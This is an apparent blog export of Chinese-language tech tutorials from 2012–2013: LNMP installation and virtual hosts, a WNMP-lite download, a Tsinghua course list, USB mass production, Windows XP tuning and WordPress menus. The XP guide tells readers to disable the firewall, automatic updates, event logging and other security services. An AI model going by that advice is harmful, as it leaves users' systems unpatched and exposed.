LNMP一键安装及多站点设置详细安装教程","slug":"set-lnmp-in-linux-vps","date":"2013-02-01T00:10:39.000Z","updated":"2024-09-28T00:17:21.252Z","comments":true,"path":"set-lnmp-in-linux-vps.html","permalink":"https://sobaigu.com/set-lnmp-in-linux-vps.html","excerpt":"","text":"对于初次接触VPS的童鞋来说，VPS多多少少有点复杂，其实简单说可以把它当做一台真正的独立服务器，而且更为方便的是可以随时重启、关机，还可以重装任意一款系统，更何况它还具有独立的网卡设置和独立ip，完完全全一台独立服务器。 认清这一点后，接下来的工作就相当容易了：对于普通用户来说，VPS的资源供给相当充足，只放置一个站点那是相当浪费，所以设法在VPS上方便快捷地增加站点、设置站点参数，成了最关键的步骤。本篇博文就以VPS上最为常用的“LNMP一键安装包”为例，说说如何在VPS上开通多个站点。 LNMP一键安装包是什么？ LNMP一键安装包是一个用Linux Shell编写的可以为CentOS/RadHat、Debian/Ubuntu VPS（VDS）或独立主机安装LNMP（Nginx、MySQL、PHP、phpMyAdmin）生产环境的Shell程序。 LNMP 官方站：http://lnmp.org 系统需求： 需要2 GB硬盘剩余空间 128M以上内存，OpenVZ的建议192MB以上 安装步骤： 注：下面加粗为 Linux 下 Centos 系统下安装lnmp 步骤。 1、更新系统： CentOS下，输入： 1yum update &lt;/span&gt; 然后等待系统更新完毕。 Ubuntu/Debian下，输入： 1apt-get dist-upgrade 等待系统更新完毕。 2、下载LNMP一键安装包： 可以选择使用下载版（推荐国外或者美国VPS使用）或者完整版（推荐国内VPS使用），如果使用下载版执行命令: 1wget -c http://soft.vpser.net/lnmp/lnmp0.9.tar.gz 如果使用完整版，执行命令: 1wget -c http://soft.vpser.net/lnmp/lnmp0.9-full.tar.gz 执行上述命令后LNMP一键安装包就会被下载到VPS上. 3、解压一键安装包： 12tar zxvf lnmp0.9.tar.gztar zxvf lnmp0.9-full.tar.gz #解压完整版 执行以上两条中之一就会将LNMP一键安装包解压缩。 4、CentOS下安装步骤 首先进入已解压的文件夹 12cd lnmp0.9 #下载版执行命令cd lnmp0.9-full #完整版执行命令 然后再执行: 1./centos.sh 也可以执行: 1./centos.sh | tee lnmp.log （推荐第二种方式，出错时可以到论坛上传lnmp.log日志），输入要绑定的域名（建议使用一个二级域名，该域名会绑定到/home/wwwroot/），回车，再输入要设置的MySQL root的密码，回车，提示”Press any key to start…”，按任意键开始安装。程序会自动安装编译Nginx、PHP、MySQL、phpMyAdmin、Zend这几个软件。 5、Debian下安装步骤 进入解压后的文件夹执行: 123./debian.sh#也可以执行以下命令./debian.sh | tee lnmp.log 输入要绑定的域名（建议使用一个二级域名，该域名会绑定到/home/wwwroot/`），回车，再次输入VPS/服务器所在位置：asia、america、europe、oceania或africa，回车，再输入要设置的MySQL root的密码，回车，提示”Press any key to start…”，按任意键开始安装。程序会自动安装编译Nginx、PHP、MySQL、phpMyAdmin、Zend这几个软件。 6、Ubuntu下安装步骤 进入解压后的文件夹执行然后执行: 123./Ubuntu.sh#也可以执行以下命令./Ubuntu.sh | tee lnmp.log 输入要绑定的域名（建议使用一个二级域名，该域名会绑定到/home/wwwroot/），回车，再输入要设置的MySQL root的密码，回车，提示”Press any key to start…”，按任意键开始安装。程序会自动安装编译Nginx、PHP、MySQL、phpMyAdmin、Zend这几个软件。 安装其他组件 1、安装eAccelerator，执行如下命令：./eaccelerator.sh 就会自动安装并重启web服务。 2、安装ionCube，执行如下命令：./ionCube.sh 就会自动安装并重启web服务。 3、安装PureFTPd和管理面板，执行如下命令：./pureftpd.sh 按提示输入你MySQL的root密码、FTP用户管理面板的密码、MySQl的FTP数据库密码（可直接回车，自动生成一个密码），回车确认，就会自动安装PureFTPd，安装完PureFTPd，在浏览器执行http://你的域名或IP/ftp/ 输入你前面设置的FTP用户管理面板的密码，就可以管理。 4、安装VsFTPD，执行如下命令：./vsftpd.sh 就会自动安装上vsftpd，只需要执行命令：useradd -d /home/wwwroot -s /sbin/nologin adminftp 添加上帐号指定好ftp帐号的根目录，再执行：passwd adminftp 设置上密码，登录就可以了。 注：3 和 4任选一个即可，但由于3中所说的PureFTPd带有图形界面，所以推荐初学者使用。 虚拟主机管理 1、添加虚拟主机，执行如下命令：/root/vhost.sh 根据提示输入要绑定的域名，回车，如果需要添加更多的域名，输入 y ，再输入要另外绑定的域名，多个域名可以用空格隔开。再输入域名绑定的目录（绝对目录，如/home/wwwroot/lnmp，如果不填默认是/home/wwwroot/绑定的域名），再选择是否添加伪静态规则，默认已经有了Discuz、WordPress、Sablog、emlog、dabr，可直接输入以上名称即可，如果需要添加自定义伪静态规则，直接输入一个想要的名字，程序会自动创建伪静态文件，直接在/usr/local/nginx/conf/你自定义的伪静态名字.conf 里面添加伪静态规则就行。接下来会提示是否需要启用日志功能，一般情况下不需要启动，直接输入n就行，如需启动，输入 y ，再输入要定义的日志文件名字，回车就会自动添加虚拟主机。 2、删除虚拟主机，ssh执行： 123456rm /usr/local/nginx/conf/vhost/域名.conf/root/lnmp &#123;start|stop|reload|restart|kill|status&#125; #LNMP状态管理/etc/init.d/nginx &#123;start|stop|reload|restart&#125; #Nginx状态管理/etc/init.d/php-fpm &#123;start|stop|quit|restart|reload|logrotate&#125; #PHP-FPM状态管理/etc/init.d/pureftpd &#123;start|stop|restart|kill|status&#125; #PureFTPd状态管理/etc/init.d/mysql &#123;start|stop|restart|reload|force-reload|status #MySQL状态管理 相关图形界面程序 1234http://前面输入的域名或IP/phpinfo.php #phpinfohttp://前面输入的域名或IP/phpmyadmin #phpMyAdminhttp://前面输入的域名或IP/p.php #探针http://前面输入的域名或IP/ftp #PureFTP管理界面 LNMP相关目录 12345/usr/local/nginx #nginx/usr/local/mysql #mysql/usr/local/php #php/home/wwwroot #网站目录/home/wwwlogs #Nginx日志目录 LNMP相关配置文件 12345/usr/local/nginx/conf/nginx.conf #Nginx主配置文件/etc/my.cnf #MySQL配置文件/usr/local/php/etc/php.ini #PHP配置文件/usr/local/pureftpd/pure-ftpd.conf #PureFtpd配置文件/usr/local/pureftpd/pureftpd-mysql.conf #PureFtpd MySQL配置文件 原文地址：http://www.weidao.net/524.html","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"WNMP-lite:Windows下最小的Nginx+PHP+MySQL绿色集成运行环境","slug":"software-wnmp-lite","date":"2013-01-26T01:03:06.000Z","updated":"2024-09-28T00:17:21.252Z","comments":true,"path":"software-wnmp-lite.html","permalink":"https://sobaigu.com/software-wnmp-lite.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文英文 文件大小：5.5 m 支持系统：Windows 官方主页： 软件介绍 wnmp-lite是Windows下最小的nginx+PHP+MySQL绿色集成运行环境 基于NPM-Lite优化： 支持多个站点，请在：/conf/vhost.conf配置多个站点 增加mysql客户端工具：/tools/MySQL-Front phpcgi-daemon.cmd是维护php-cgi进程的奶妈程序 NPM-Lite： NPM-Lite 是断翅孤雁(lanwaren123(a)163.com)制作发布的最小 PHP + MySQL 运行环境. 已经包含了 MySQL, GD2, mcrypt, Zend Optimizer,非常适合WordPress等网站本地产品开发及测试,以及用于产品打包! hidecmd.exe 作为 后台运行进程 和 关闭进程用. 默认端口http: 80 mysql: 3306 mysql root 默认密码为空，请及时更改密码。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 qtyi","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"清华大学计算机系列网络课程视频光盘下载「转」","slug":"tsinghua-university-computer-iso","date":"2013-01-19T00:54:51.000Z","updated":"2024-09-28T00:17:21.252Z","comments":true,"path":"tsinghua-university-computer-iso.html","permalink":"https://sobaigu.com/tsinghua-university-computer-iso.html","excerpt":"","text":"当年自学的时候收藏的教程，今天整理发现居然还在，而且对组合数学有问题的地方做了修改，真是难得。估计有人需要，现提供网盘下载 “清华大学计算机系列网络课程光盘下载”)，同时提供当时的课表 欢迎收藏转载，但请注明出自搜百谷。 计算机科学与技术专业核心课程6 门，17学分 课号 课程名 学分 先修要求 40240433 计算机系统结构 3(春) 操作系统 30240243 操作系统 3(春) 计算机组成原理,数据结构 40240144 编译原理 4(春) 数据结构 40240243 计算机网络 3(秋) 操作系统 40240432 形式语言与自动机 2(秋) 离散数学（1） 20240103 汇编语言程序设计 3(秋) 计算机科学与技术专业限选课不少于11学分,其中： 计算机系统结构-----计算机科学与技术专业选修不少于2学分 课号 课程名 学分 先修要求 30240253 微计算机技术 3 汇编语言程序设计 嵌入式系统 3 计算机组成原理 操作系统 40240412 数字系统设计自动化 2 数字逻辑电路 30240222 VLSI设计导论 2 数字逻辑电路 计算机软件与理论---计算机科学与技术专业选修不少于2学分 课号 课程名 学分 先修要求 初等数论及其应用 2 离散数学 30240192 高性能计算导论 2 （英语讲课）计算机系统结构 30240262 数据库系统原理 2 数据结构 网络编程与计算技术 2 计算机组成原理 软件开发方法 2 C++ 数据结构 软件工程 30240134 软件工程 3 C++ 数据结构 &nbsp; 计算机应用技术-----计算机科学与技术专业选修不少于2学分 课号 课程名 学分 先修要求 30240042 人工智能导论 2 离散数学 40240452 模式识别 2 几何与代数 概率与统计 人工智能导论 40240062 数字图象处理 2 概率与统计 程序设计基础 40240392 多媒体技术基础及应用 2 信号处理原理 40240422 计算机图形学基础 2 数据结构 40240472 计算机实时图形和动画技术 2 几何与代数 40240402 虚拟现实 2 计算机组成原理 40240462 现代控制技术 2 系统分析与控制 40240372 信息检索 2 数据结构 40240362 电子商务平台及核心技术 2 数据结构 JAVA程序设计 数据库系统原理 40240492 数据挖掘 2 数据库系统原理 &nbsp; 计算机科学与技术专业专题训练不少于5学分,其中计算机网络专题训练为必选 课号 课程名 学分 先修要求 计算机网络专题训练 1(秋) 操作系统专题训练 2(秋) 编译原理专题训练 2(秋) 数据库专题训练 2(秋) 计算机科学与技术专业的任选课程 课号 课程名 学分 先修要求 30240253 微计算机技术 3 汇编语言程序设计 初等数论及其应用 2 离散数学 网络编程与计算技术 2 计算机组成原理 30240134 软件工程 3 C++ 数据结构 30240042 人工智能导论 2 离散数学 40240452 模式识别 2 几何与代数 概率与统计 人工智能导论 40240062 数字图象处理 2 概率与统计 程序设计基础 40240392 多媒体技术基础及应用 2 信号处理原理 40240422 计算机图形学基础 2 数据结构 40240472 计算机实时图形和动画技术 2 几何与代数 40240402 虚拟现实 2 计算机组成原理 40240462 现代控制技术 2 系统分析与控制 40240372 信息检索 2 数据结构 40240362 电子商务平台及核心技术 2 数据结构 JAVA程序设计 数据库系统原理 40240492 数据挖掘 2 数据库系统原理","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"}]},{"title":"[原创]金士顿U盘量产图文教程","slug":"udiskmassproduction","date":"2012-12-04T21:47:48.000Z","updated":"2024-09-28T00:17:21.252Z","comments":true,"path":"udiskmassproduction.html","permalink":"https://sobaigu.com/udiskmassproduction.html","excerpt":"喜欢摆弄系统的人经常会下一堆iso文件,兴致来时还会自己动手加以改造,在里面雁过留名一把,不图利,没事自己装个虚拟机暗爽一把. 在以前,会买个刻录机,买一堆垃圾碟片.现在想来真傻,07年那会儿花400大洋买了个刻录机,带光雕的,没刻几回,就再也没用过. 从此接触了u盘量产,现在在论坛里还能见到有人问起怎么量产,正好我一直想做个图文教程,那就拿出我08年买的金士顿u盘来练练吧.(想想现在的内存,真tm便宜,哥买的这个才1g,花了近100大洋,不过还好,久经摧残,现在还是很健康.) 有人问,为什么要量产呢?直接ultraiso写一个不就好了么? 具体的孰优孰劣我就不分析了,总之u盘量产成usb-cdroom后兼容性没得说,一次量产完成,之后也不用考虑遭破坏.当然,这个u盘空间想要做其他用途或者想换个启动盘时也麻烦,需要重新量产回来.","text":"喜欢摆弄系统的人经常会下一堆iso文件,兴致来时还会自己动手加以改造,在里面雁过留名一把,不图利,没事自己装个虚拟机暗爽一把. 在以前,会买个刻录机,买一堆垃圾碟片.现在想来真傻,07年那会儿花400大洋买了个刻录机,带光雕的,没刻几回,就再也没用过. 从此接触了u盘量产,现在在论坛里还能见到有人问起怎么量产,正好我一直想做个图文教程,那就拿出我08年买的金士顿u盘来练练吧.(想想现在的内存,真tm便宜,哥买的这个才1g,花了近100大洋,不过还好,久经摧残,现在还是很健康.) 有人问,为什么要量产呢?直接ultraiso写一个不就好了么? 具体的孰优孰劣我就不分析了,总之u盘量产成usb-cdroom后兼容性没得说,一次量产完成,之后也不用考虑遭破坏.当然,这个u盘空间想要做其他用途或者想换个启动盘时也麻烦,需要重新量产回来. 开始正题,在量产时我们需要准备: 1.用来量产的u盘—废话 2.u盘芯片检测工具—点此下载最新版本 3.u盘量产工具—检测到芯片后到网上搜索相应量产工具 4.量产用的启动盘iso文件—自己网络上去搜索下载,推荐到无忧论坛去找. 前面说了,我有个08年的金士顿1G的u盘,为了艺术,再次牺牲一次. 万事具备,我们可以开始了.开始前建议将无关的程序退出. 第一步:检测u盘芯片型号 将u盘插上,启动下载的软件,如图1所示.一般程序会自动将焦点锁定u盘盘符,在下面框里可以看到芯片型号.我那08年的u盘芯片为smi32x的. 第二步:查找量产工具 知道自己u盘的芯片信号,那么就到网络上找对应的量产工具,这里我已经有了适合本u盘使用的量产工具:点击下载SMI_I1126.7z,工具运行后,当u盘已经插入时将在对应的地方以颜色表示. 第三步:量产参数设置 主要设置盘符标签,分区大小等.我们其他都让其默认,勾选&quot;make autorun&quot;,点击后面的选择按钮,查找选择你准备量产的iso文件,点击ok按钮返回.这个时候我们就可以点击start了,开始需要检测过程,如图4所示. 开始量产后需要的过程根据你的iso大小和你的u盘写入速度而定,可能需要一个较长的过程,在此过程中,请不要插拔u盘,建议不要手动停止量产操作,静待程序自动完成.完成时如果量产成功,将以绿色标记pass,此时退出软件,重新插拔u盘就可以了.如果量产时设置分两个区,那么量产iso后多余的空间将分出一个u盘,插上时应该会提示需要格式化,按提示格式化即可,不会影响到已经量产完成的启动盘. 当然,量产有风险,有成功也会有失败,如图7所示.看到大红fail也不要惊慌,请按以上步骤重新做一次,再不成,再做一次. 如果哪天你想还原u盘,那么请在u盘量产设置中将&quot;make autorun:取消勾选,再次按以上量产步骤量产一次即可恢复. 或者可以搜索专门用来量产恢复的量产工具恢复量产即可.如有兴趣,请按以上步骤亲自操作一遍,不要怕搞坏,现在一个u盘才几十块钱兴趣和自己的双手是最好的老师,相信操作过后就变得很简单了. good luck!","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"Windows XP启动跑1圈就进系统","slug":"windows-xp-1-cycle","date":"2012-11-17T15:53:06.000Z","updated":"2024-09-28T00:17:21.252Z","comments":true,"path":"windows-xp-1-cycle.html","permalink":"https://sobaigu.com/windows-xp-1-cycle.html","excerpt":"","text":"近日被人问起如何让系统启动更快，好久不研究，网上找了篇，写得还是很详细，收藏。谢谢原作者。 原文出处：http://csunews.com/oblog4/asp.asp/eduedu/archives/2009/879.html 第一步:进设备管理器，分别进primary(second)de channel属性，把不用的device type改成none。 第二步:寻找 1HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\ControlSession Manager\\Memory Management\\Prefetch\\Parameters 有一个键EnablePrefetcher把它的数值改为1。 在C2433,98M,40G.试验过只跑一圈就进winxp了! 瘦身行动 1、在各种软硬件安装妥当之后，其实XP需要更新文件的时候就很少了。删除系统备份文件吧, 近3xxM：开始→运行→sfc.exe /purgecache 2、删除驱动备份： %system32%\\drivercache\\i386目录下的driver.cab文件，通常这个文件是76M 3、偶没有看help的习惯，所以保留着help目录下的东西对我来说是一种伤害，呵呵。。。都干掉，近4xM。 4、一会在升级完成后你还会发现%Windows%多了许多类似$NtUninstallQ311889$这些目录，都干掉吧，1x-3xM。 5、正好硬盘中还有win2000/server等，所以顺便把pagefile.sys文件都指向一个地方：控制面板→系统→性能—高级→虚拟内存→更改，注意要点“设置”才会生效。 6、卸载不常用组件：用记事本修改 %Windir%\\inf\\sysoc.inf 用查找/替换功能，在查找框中输入,hide，全部替换为空。这样，就把所有的,hide都去掉了，存盘退出后再运行“添加-删除程序”，就会看见“添加/删除 Windows 组件”中多出不少选项；删除掉游戏啊，码表啊等不用的东西。 7、删除Windowsime下不用的输入法，8xM。我重新安装了自己用的输入法。 8、如果实在空间紧张，启用NTFS的压缩功能，这样还会少用2x% 的空间，不过我没作。 9、关了系统还原，这破功能对我这样常下载、测试软件的人来说简直是灾难，用鼠标右健单击桌面上的“我的电脑”，选择“属性”，找到“系统还原”，选择“在所有驱动器上关闭系统还原”呵呵，又可以省空间了。 10、还有几个文件，挺大的，也没什么用。。。。忘了名字 ：（ ，刚安装的系统可以用查找功能查找大于50M的文件来看看，应该能找到的。 如果你能按照上面的过程做完，你的原本1.4G的XP，完全可以减少到800以下。 加速计划 WinXP的启动会有许多影响速度的功能，尽管ms说已经作最优化处理过，但对我们来说还是有许多可定制之处。我一般是这样来做的。 1、修改注册表的run键，取消那几个不常用的东西，比如Windows Messenger 。 启用注册表管理器：开始→运行→Regedit,找到 12HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MSMSGS /BACKGROUND#这个键值，右键删除，世界清静多了，顺便把那几个什么cfmon的都干掉吧 2、修改注册表来减少预读取，减少进度条等待时间，效果是进度条跑一圈就进入登录画面了，开始→运行→regedit启动注册表编辑器，找 1HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\Prefetch\\Parameters 有一个键EnablePrefetcher把它的数值改为“1”。 3、关闭系统属性中的特效，这可是简单有效的提速良方。点击开始→控制面板→系统→高级→性能→设置，在视觉效果中，设置为调整为最佳性能→确定即可。这样桌面就会和win2000很相似的，我还是挺喜欢XP的蓝色窗口，所以在“在窗口和按钮上使用视觉样式”打上勾，这样既能看到漂亮的蓝色界面，又可以加快速度。 4、我用Windows commadner＋Winrar来管理文件，Win XP的ZIP支持对我而言连鸡肋也不如，因为不管我需不需要，开机系统就打开个zip支持，本来就闲少的系统资源又少了一分，点击开始→运行，敲入：regsvr32 /u zipfldr.dll双引号中间的，然后回车确认即可，成功的标志是出现个提示窗口，内容大致为：zipfldr.dll中的Dll UnrgisterServer成功。 5、据说XP的一个系统服务Qos，这个调度要占用一定的网络带宽，像我这样的一毛不拔的人是无法忍受的，去掉方法是：开始菜单→运行→键入 gpedit.msc ，出现“组策略”窗口， 展开 “管理模板”→“网络” ， 展开 “QoS 数据包调度程序”， 在右边窗右键单击“限制可保留带宽” ，在属性中的“设置”中有“限制可保留带宽&quot; ，选择“已禁用”，确定即可。当上述修改完成并应用后，用户在网络连接的属性对话框内的一般属性标签栏中如果能够看到&quot;QoS Packet Scheduler（QoS 数据包调度程序）&quot;。说明修改成功，否则说明修改失败，顺便把网络属性中的那个Qos 协议也一起干掉（卸载）吧。 6、快速浏览局域网络的共享 通常情况下，Windows XP在连接其它计算机时，会全面检查对方机子上所有预定的任务，这个检查会让你等上30秒钟或更多时间。去掉的方法是开始→运行→Regedit→在注册表中找到 1HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\Current Version\\Explorer\\RemoteComputer\\NameSpace 。在此键值下，会有个&#123;D6277990-4C6A-11CF-87-00AA0060F5BF&#125;键，把它删掉后，重新启动计算机，Windows XP就不再检查预定任务了，hoho~~~ ，速度明显提高啦！ 7、关掉调试器Dr. Watson 我好像从win95年代开始一次也没用过这东西，可以这样取消：打开册表，找到 1HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AeDebug 子键分支，双击在它下面的Auto键值名称，将其“数值数据”改为0，最后按F5刷新使设置生效，这样就取消它的运行了。沿用这个思路，我们可以把所有具备调试功能的选项取消，比如蓝屏时出现的memory.dmp，在我的电脑→属性→高级→设置→写入调试信息→选择无等等。 8、被我终止的服务列表以及相关说明 1)alerter 错误警报 2)automatic updates Windows 自动更新 3)background intelligent transfer service 微软说使用空闲的网络带宽传数据 4)clipbook 与远程电脑来共享剪贴板内容，我看还是免了吧 5)Computer browser 说什么要维护网络更新列表 6)DHCP client 我不需要这东西 7)Distributed link tracking client 保持局域网连接更新等信息，偶很少用局域网，这东西占用4M左右内存。 8)Distributed Transaction coordinator 协调***，和上面的差不多 9)DNS Client 我不需要这东西 10)Error reporting service 错误报告 11)Event Log 系统日志纪录 12)Fast user switching compatibility 用户切换 13)help and support 帮助 14)Human interface device access 据说是智能设备。。。 15)IMAPI CD-burning COM service 偶不用这个刻碟 16)Indexing service 索引，索引什么呢？ 17)Internet Connection Firewall(ICF) ICF防火墙 18)IPSEC Services 这个我不懂，你想知道问Quack去 19)Logical Disk manager administrative service 配置磁盘 20)messenger 好像net send 等东西用的就是这个功能 21)MS software shadow copy provider 卷复制备份的 22)Net Logon 我可不想让黑客远程登录进来，关！ 23)Netmeeting remote desktop sharing 我不用netmeeting 24)Network DDE 动态数据交换传输 25)Network DDE DSDM 和上面差不多 26)Network Location Awareness 关，我的机子不作共享 27)NTLM Security support provider－telnet 呵呵，关！ 28)Performance logs and alert 将系统状态写日志或发警告 29)Portable media serial number 关！ 30)Print Spooler 打印机，不幸的是我的机子不连接Print ~ QoS RSVP 关！ 32)Remote desktop help session manager 远程帮助服务 33)remote Procedure Call LOCATOR 管理RPC 34)remote registry 远程管理注册表 35)removable storage 36)routing and remote access 我干脆禁用了它 37)security accounts manager 我的系统只是一个客户系统，不用iis。 38)smart card 39)smart card helper 关！！！ 40)SSDP Discovery service 我用不到这个 41)system event notification 如果是服务器肯定要记录的 42)system restore service 系统还原服务 43)task scheduler Windows 计划服务 44)Telephony 拨号服务，我不拨号还不行吗？ 45)telnet 46)terminal services 终端服务 47)uninterruptible power supply UPS，我没有呀 48)universal plug and play device host 太先进了点，用不到 49)upload manager 关了也能传输文件的 50)volume shadow copy 又是备份，晕 51)webclient 没用过 52)Windows Installer MSI服务，我一直关着。 53)Windows image acquisition (WIA) 数码设备用的 54)Windows management instrumentation driver extensions 关了 55)Windows time 时间服务 56)wireless zero configuration 无线网络，偶用不到的 57)WMI perfromance adapter 关！ 这里面的一些服务是刚开始就是关的，但我忘了，所以只好把现在系统中关闭的服务基本都列了出来。你根据自己的情况酌情处理吧。 我安全吗 多了不谈，基本的共享还是得关的： 修改注册表为以下两个样式： 去除共享 Windows Registry Editor Version 5.00 HKEY_LOCAL_MACHINESYSTEMCurrentControlSetservicesLanmanServerParameters] “AutoShareServer”=dword:00000000 “AutoSharewks”=dword:00000000 去除IPC$管理 Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlLsa] “restrictanonymous”=dword:00000001 或者将上面两个保存成个.REG文件，然后双击导入就可以了。 顺便把不要脸的的3721也屏蔽，在hosts文件中加入： 127.0.0.1 cnsmin.3721.com 127.0.0.1 www.3721.net 其他技巧 1、给鼠标右键增加个复制到…/移动到…功能 Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINESOFTWAREClassesAllFilesystemObjectsshellex] [HKEY_LOCAL_MACHINESOFTWAREClassesAllFilesystemObjectsshellexContextMenuHandlers] [HKEY_LOCAL_MACHINESOFTWAREClassesAllFilesystemObjectsshellexContextMenuHandlersCopy To] @=“{C2FBB630-2971-11D1-A18C-00C04FD75D13}” [HKEY_LOCAL_MACHINESOFTWAREClassesAllFilesystemObjectsshellexContextMenuHandlersMove To] @=“{C2FBB631-2971-11D1-A18C-00C04FD75D13}” 将上面内容保存成add.reg文件，然后双击导入就可以了。 2、关了错误报告，KAO ！这东西搞得我像个微软免费的测试员似的：点击控制面板----&gt;系统----&gt;高级----&gt;右下角—&gt;错误报告----&gt;禁用错误汇报——&gt;确定！ 3、取消分组显示：右键单击任务栏的空白区域，在弹出的菜单中选择“属性”，在弹出的窗口中，取消“分组相似任务栏按钮”前面的对钩，确定就可以了。 4、找回经典的登录窗口，WinXP默认的登录界面虽然漂亮，但如果你想用一个列表中没有的用户登录，你会发现无从下手，改回经典窗口的方法是：点击“开始”→“控制面板”→“用户账户”→“更改用户登录或注销的方式”→把“使用欢迎屏幕”前面的对钩取消，最后点“应用选项”就OK啦。 5、将自己最常用的输入法设置一个快捷键：点击“开始”→“控制面板”→“区域和语言选项”→在弹出的窗口中选择“语言”→“详细信息”→“键设置”在弹出的窗口中找到自己用的输入法，点“更改按键顺序”→在这里选一个快捷键就可以了。 6、关闭计算机时自动结束不响应的任务，注册表: HKEY_CURRENT_USERControl PanelDesktop 中的“AugoEndTasks”的键值改为“1” 7、关闭自动更新：右键单击“我的电脑”，点击属性，点击“自动更新”，在“通知设置”一栏选择“关闭自动更新。我将手动更新计算机”一项。 8、减少开机磁盘扫描等待时间: 开始→运行,键入: chkntfs/t:0 然后连接到ms站点顺便升级一次就算优化基本完成，对于XP而言，可以采用许多内部命令来看看优化情况，比如tasklist.exe /svc 可以查看系统服务实际使用情况。 优化一个系统，挺麻烦的。所以我们把他保存起来，我们用Ghost生成.GHO文件，这样就可以拿给别人炫耀一下啦，在Ghost之前先要作一个事情，清除系统硬件、注册等信息，否则克隆到不同的机子上将无法启动，在Winxp安装盘上找Deploy.cab 中的sysprep.exe文件。 执行sysprep.exe，选择“重新封装”，下面的标记中可以选择“已提前激活”，还可以选择封装完成后是关机还是重新启动。封装完成后，我们再用带有Ghost的系统盘启动，用Ghost来生成备份.GHO镜像，备份完成！","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"导航菜单图文使用教程","slug":"wordpress-navi-menu","date":"2012-11-16T15:48:35.000Z","updated":"2017-11-30T01:09:48.000Z","comments":true,"path":"wordpress-navi-menu.html","permalink":"https://sobaigu.com/wordpress-navi-menu.html","excerpt":"前言 WordPress已经功能已经很强大，整体很棒，网上找了知更鸟的HotNewspro主题，very nice，也到知更鸟的站去逛了逛，发现WordPress自带修改导航的接口。以前都是到处找相关文章，又是装插件又是改模板的，一个字，累！ 本来是直接贴知更鸟的那篇教程的，但提示请将图片上传到自己的空间，干脆，自己写吧，也刚好加点自己的体会。废话不多说，开始正题。","text":"前言 WordPress已经功能已经很强大，整体很棒，网上找了知更鸟的HotNewspro主题，very nice，也到知更鸟的站去逛了逛，发现WordPress自带修改导航的接口。以前都是到处找相关文章，又是装插件又是改模板的，一个字，累！ 本来是直接贴知更鸟的那篇教程的，但提示请将图片上传到自己的空间，干脆，自己写吧，也刚好加点自己的体会。废话不多说，开始正题。 设置方法 首先点击外观&gt;菜单项可以弹出如图显示，如果没有创建过菜单的话，在右边输入你要创建的菜单名，点创建菜单就可以了。 创建菜单后，可以将链接或者你创建的分类添加到菜单，默认添加都是一级菜单，如果要添加二级甚至是三级菜单，只需要在右边菜单里用鼠标往右拖动，每一级程序都会自动吸附，很直观，也没什么难的。 新手提醒 这里有必要提醒下： 创建菜单后需要在&quot;主题位置&quot;处，也就是图中标注的左边，在菜单俩大字的下边，选择导航自定义菜单和页脚自定义菜单，然后点&quot;保存，打开你的首页就应该看到效果了。 设置链接打开方式 创建了菜单后问题随之而来，比如我添加了个链接到菜单里，本意是点击后在新标签打开，这样可以留住访问本站的页面，没见哪个地方有设置是不是？ 以前用过一个插件，文章中出现链接都以新标签打开，俺知道target=&quot;_blank&quot;可以实现，可这里怎么搞？想要设置菜单的属性，比如点击后是新标签或者新窗口打开还是当前窗口打开，这个在哪设置？ 少入口选项的问题google好半天，要么就是一些根本看不懂的修改代码的方法，要么看别人的教程都是有直接设置接口的，但我发现我这只有两个标签，少了三个是不是？ 后台右上角有个&quot;显示选项&quot;(对，就是屏幕的右上角，跟帮助挨一块的)，点击进去你就发现默认是没有把其他三个标签选上的，那里可以选择你希望显示的一些东西，但一般勾选上主题，分类，链接，链接目标和描述就好了。 至此，自己要的导航菜单就大功告成了! 后记 PS:我这个小小的问题麻烦了搞了好几次，在这多谢大神不厌其烦地一次次给我回复。希望我这篇短文能给与我有同样困惑的新手们一点帮助。知更鸟的这个主题真的不错，基本上不需要什么插件了，对咱这样的新手可玩性也是蛮高的。 后台无法登陆问题 在博客设置的时候还遇到了一个问题，就是登陆后那个登陆框还在，而且点击登陆按钮后链接是诸如: http://sobaigu.com/wp-login。php？redirect_to=http://sobaigu.com/Linux-device 这样的地址，而且你回到前台发现怎么登陆那个登陆框都还在，点篇文章进去你是登陆状态的，这个问题搞得我把WordPress重装过，主题换过，也顺应民意，WordPress程序换成中文版，数据库都重装过(新站随便折腾，不心疼。 最后发现原来是自己在常规选项里设置了WordPress地址和站点地址不一致导致，登陆地址改成http://sobaigu.com/wp-login.php?，然后登陆进去改成一样的就可以了。 打算改进方向 同时有时间有能力的可以改进下： 